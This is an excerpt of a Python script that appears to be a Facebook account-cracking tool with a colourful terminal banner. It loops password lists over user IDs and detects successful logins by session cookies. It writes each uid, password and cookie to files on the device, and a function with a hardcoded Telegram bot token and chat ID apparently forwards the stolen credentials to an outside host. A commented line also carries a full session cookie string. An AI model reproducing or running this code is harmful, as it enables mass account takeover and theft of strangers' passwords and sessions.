...
\x1b[1;97m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┐\033[1;37m
\x1b[1;97m┃\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m Rabindra   \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mSHADIN AFRIDI\x1b[38;5;244m] \x1b[1;97m              ┃
...
def Elite(uid,ps,coki):
    try:
        import requests
        token = "7044225986:AAH1LRdlh0rQxRzd-31qZAxG-hXRLD23GoA"#Add yout token 
        chatid = "6069933382"#Add your Chat Id
        ok_id =str(uid+'|'+ps+'|'+coki)
...
def idpaslogin(uid,passlist,tl):
        global loop,oks,cps
        sys.stdout.write(f"\r\x1b[38;5;244m(\x1b[38;5;46mHOP-XD\x1b[38;5;244m) \x1b[38;5;244m(\x1b[38;5;81m{loop}\x1b[38;5;244m) \x1b[38;5;46mOK\033[1;37m|\x1b[38;5;46m{len(oks)} \x1b[38;5;81mCP\033[1;37m|\x1b[38;5;81m{len(cps)} ");sys.stdout.flush()
        try:
            for ps in passlist:
                    session = requests.Session()
    ...
    'user-agent': us}
                    ...
                    if 'c_user' in log_cookies:
                           ...
                           if 'Photoshop' in res:
                                 print(f"\r\x1b[38;5;244m(\x1b[38;5;46mHOP-💚\x1b[38;5;244m)\x1b[38;5;46m {uid} \x1b[38;5;244m|\x1b[38;5;46m {ps}")
                                 Elite(uid,ps,coki)
                                 print("\r\033[1;34m(🍪\033[1;34m)\x1b[38;5;244m–\x1b[38;5;46m➤ \033[1;37m"+ coki)
                                 print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[1;37m')
                                 open('/sdcard/HOP/RND-M1-OK-COKIE.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
                                 oks.append(uid)
                                 break
                           else:
                                 break
                            ...
                            open('/sdcard/HOP/RND-CP.txt','a').write(uid+'|'+ps+'\n')
                            cps.append(uid)
                            break
                    else:
                            continue
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r\x1b[38;5;244m(\x1b[38;5;46mHOP-OK\x1b[38;5;244m)\x1b[38;5;46m '+ids+f' ━\x1b[38;5;244m➤\x1b[38;5;46m '+pas+'\033[1;97m')
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        headers={
                                ...
                                'cache-control': 'max-age=0',
                                # 'cookie': 'datr=tQP4ZnfotSX1524MpJy3w0K6; sb=tQP4Zt0PgbRHD8bLyaxrqlt1; ps_l=1; ps_n=1; locale=en_GB; vpd=v1%3B960x479x1.2058573961257935; dpr=1.2058573961257935; wl_cbv=v2%3Bclient_version%3A2635%3Btimestamp%3A1727796859; m_pixel_ratio=1.2058573961257935; wd=599x1199; fr=0UvTVsBDUsbm8wrqv.AWU15jikpNupSFCT7Xb0ovov-iA.Bm-AO1..AAA.0.0.Bm_KKi.AWUhpwtIT-E',
